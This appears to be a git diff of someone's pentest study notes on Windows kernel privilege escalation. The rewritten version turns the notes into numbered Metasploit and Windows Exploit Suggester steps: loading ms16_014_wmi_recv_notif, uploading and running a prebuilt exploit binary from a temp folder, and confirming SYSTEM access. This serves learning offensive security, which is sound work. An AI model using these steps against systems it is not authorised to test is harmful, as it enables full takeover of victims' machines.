@@ -1,97 +1,130 @@
 # Windows Kernel Exploits
 
-## Privilege Escalatation
-- Privilege Escalation is the process of exploiting vulnerabilites or misconfigurations in systems to elevate privileges from one user to another, typically to a user with administrative or root access on a system.
-- Privilage Escalation is a vital element of the attack life cycle and is a major determinant in the overall success of a pentest.
-- After gaining an initial foothold on a target system you will be required to elevate your privileges in order to perform tasks and functionality that require administrative privileges.
+## Privilege Escalation
+- Privilege Escalation involves exploiting vulnerabilities or misconfigurations to elevate access from a standard user to one with administrative or root privileges.
+- This is critical in a penetration test to gain full control of a system after an initial compromise.
+- Once a foothold is gained, escalating privileges allows you to perform tasks that require higher-level access.
 
 ## Windows Kernel
-- A Kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers.
-- Windows NT is the kernel tht comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exeptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
-  1. User Mode - Programs and services running in user mode have limited access to system resources and functionality.
-  2. Kernel Mode - Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.
-
-If we can exploit the windows kernel, and execute code in kernel mode, this code will be executed with highest level of privileges available.
-Kernel interaction means increased likelyhood for system crashed and data loss. Not for enterprise environment
+- The Kernel is the core component of an operating system, managing system resources and hardware interactions.
+- **Windows NT Kernel**: Used by all versions of Microsoft Windows, with two main operation modes:
+  - **User Mode**: Limited access to system resources, typically for standard applications and services.
+  - **Kernel Mode**: Full access to system resources, used by the OS to manage hardware and execute critical system functions.
+  
+- Exploiting the Windows kernel allows code execution with the highest system privileges, potentially leading to full control over the target system.
 
 ## Windows Kernel Exploitation
-- Kernel exploits on Windows will typically target vulnerabilites in the Windows kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.
-- This process will differ based on the version of Windows being targeted and the kernel exploit being used.
-- Privilege escalation on Windows systems will typically follow the following methodology:
-  - Identifying kernel vulnerabilites
-  - Downloading, compiling and transferring kernel exploits onto the target system.
- 
+- **Targeting Vulnerabilities**: Windows kernel exploits focus on specific vulnerabilities to execute code with elevated privileges.
+- **Privilege Escalation Process**:
+  - Identify kernel vulnerabilities.
+  - Download, compile, and transfer kernel exploits to the target system.
+
 ## Tools & Environment
-- Windows Exploit Suggester - Compares target patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules
-- Windows-Kernel-Exploits - Collection of Windows Kernel exploits sorted by CVE
+- **Windows Exploit Suggester**: Compares the target's patch levels against a vulnerability database to detect missing patches and potential exploits.
+- **Windows-Kernel-Exploits**: A collection of Windows Kernel exploits sorted by CVE.
 
 ## Demo
 
-msf6: `sessions`: In our case, we have a powerhsell and a meterpreter x64 session 
-![grafik](https://github.com/user-attachments/assets/c50b2df5-5cd1-428e-bcd2-05b5339728b6)
+1. **List Active Sessions**  
+   `sessions`  
+   - Lists all active sessions. Identifies available sessions, such as a PowerShell or Meterpreter session.
 
-msf6 meterpreter: `getsystem`
+2. **Attempt Privilege Escalation with Meterpreter**  
+   `getsystem`  
+   - Attempts to elevate privileges to system level within the current session.
 
-msf6: `search suggester` (before that we put meterpreter in background
+3. **Search for the Exploit Suggester Module**  
+   `search suggester`  
+   - Searches for modules related to exploit suggestion in Metasploit. Prepares to use the Windows Exploit Suggester.
 
-msf6: `use 0`
+4. **Select the Exploit Suggester Module**  
+   `use 0`  
+   - Selects the first module from the search results.
 
-msf6: `show options`
+5. **Show Module Options**  
+   `show options`  
+   - Displays configurable options for the selected module.
 
-msf6: `sessions`
+6. **List Active Sessions Again**  
+   `sessions`  
+   - Lists sessions to identify the session number needed for further exploitation.
 
-msf6: `run`: Enumerates all vulnerabilites in this version of windows and what metasploit modues we can use
+7. **Run the Exploit Suggester**  
+   `run`  
+   - Enumerates vulnerabilities on the target system and suggests applicable Metasploit modules.
 
-We can google the metasploit framework to get more info.
+8. **Use the Suggested Kernel Exploit**  
+   `use exploit/windows/local/ms16_014_wmi_recv_notif`  
+   - Loads the specific kernel exploit module for privilege escalation.
 
-msf6: `use exploit/windows/local/ms16_014_wmi_recv_notif`
+9. **Show Exploit Options**  
+   `show options`  
+   - Displays the settings required for the loaded exploit module.
 
-msf6: `show options`
+10. **Set the Session ID**  
+    `set SESSION 3`  
+    - Specifies the session to use for the exploit. Adjust according to the active session ID.
 
-msf6: `set SESSION 3`
+11. **Set Local Port**  
+    `set LPORT 4422`  
+    - Configures the local port for the reverse shell connection.
 
-msf6: `set LPORT 4422`
+12. **Execute the Kernel Exploit**  
+    `exploit`  
+    - Runs the exploit, attempting to gain elevated privileges on the target system.
 
-msf6: `exploit`
+13. **Check User Identity Post-Exploitation**  
+    `getuid`  
+    - Confirms the current user’s identity to verify successful privilege escalation.
 
-Now we should get a meterpreter session with elevated privileges.
+14. **Background the Current Session**  
+    `background`  
+    - Backgrounds the current session, keeping it active while allowing further actions.
 
-meterpreter: `getuid` we successfully elevated our privileges with the kernel exploit
+15. **Switch to the Unprivileged Session**  
+    `session 3`  
+    - Switches to an unprivileged session for verification.
 
-background
+16. **Check User Identity Again**  
+    `getuid`  
+    - Verifies the identity in the unprivileged session.
 
-msf6: `session 3`: we switch to session 3 which is unprivileged
+### Using Windows Exploit Suggester
 
-meterpreter: `getuid`: we verify if thats the case
+1. **Open a Shell on the Target**  
+   `shell`  
+   - Drops to a command shell on the target system.
 
-We check out the Windows Exploit Suggester
+2. **Gather System Information**  
+   `systeminfo`  
+   - Collects system information, including installed hotfixes, to assess vulnerabilities.
 
-meterpreter: `shell`
+3. **Copy System Information to a Text File**  
+   - Create a text file (`win7.txt`) to save `systeminfo` output for further analysis.
 
-shell: `systeminfo`: we need to copy into a txt file because it contains a list of hotfixes and based on this the windows exploit will determine which exploit can be used against this version of windows with this hotfixes installed.
+4. **Update the Exploit Suggester Database**  
+   `./windows-exploit-suggester.py --update`  
+   - Updates the vulnerability database for the Windows Exploit Suggester tool.
 
-new terminal: `Desktop`
-`vim win7.txt`
-copy systeminfo
-`quit`
-`ls` check if stored
-`cd WIndows-Enum/WindowsExploitSuggester`: move into github rep directory
-`./windows-exploit-suggester.py --update`: Downloads new vulnerability database
-`./windows-exploit--suggester.py`:runs it
-`--database 20xx-xx-xx-mssb.xls --systeminfo ~/Desktop/win7.txt`: those at very top are the exploits with the most chances. We can copy the MS Vuln. ID and google. We check the exploit in GitHub. There we can find the prebuild binary which we can run. Then we should have evelated privileges.
+5. **Run the Exploit Suggester**  
+   `./windows-exploit-suggester.py --database 20xx-xx-xx-mssb.xls --systeminfo ~/Desktop/win7.txt`  
+   - Compares the system info with the database to suggest applicable exploits.
 
-We use the meterpreter access to upload this exploit into the temp directory on the windows system
-`cd C:\\`: we never use the home directory on a user account, because its frequently accessed by the user.
-`upload ~/Downloads/41015.exe`
-`shell`
-C:\tEMP: `dir`
-C:\tEMP: `410015.exe` We use the kernel exploit
-C:\tEMP: `.\41015.exe`
-C:\tEMP: `whoami` nt authority system. We got successfully access to the targer
+6. **Transfer the Exploit to the Target System**  
+   `upload ~/Downloads/41015.exe`  
+   - Uploads the selected exploit binary to the target system.
 
+7. **Navigate to the Temp Directory**  
+   `cd C:\\tEMP`  
+   - Moves to the temporary directory on the target system, a safe location to execute the exploit.
 
+8. **Execute the Exploit**  
+   `.\41015.exe`  
+   - Runs the uploaded kernel exploit on the target system.
 
-
-
-
-
+9. **Check for Elevated Privileges**  
+   `whoami`  
+   - Confirms successful privilege escalation by checking the user identity, expecting "nt authority\system".
+  
+  THis metasploit module can be used to identify kernel exploits on a target::
+  multi/recon/local_exploit_suggester
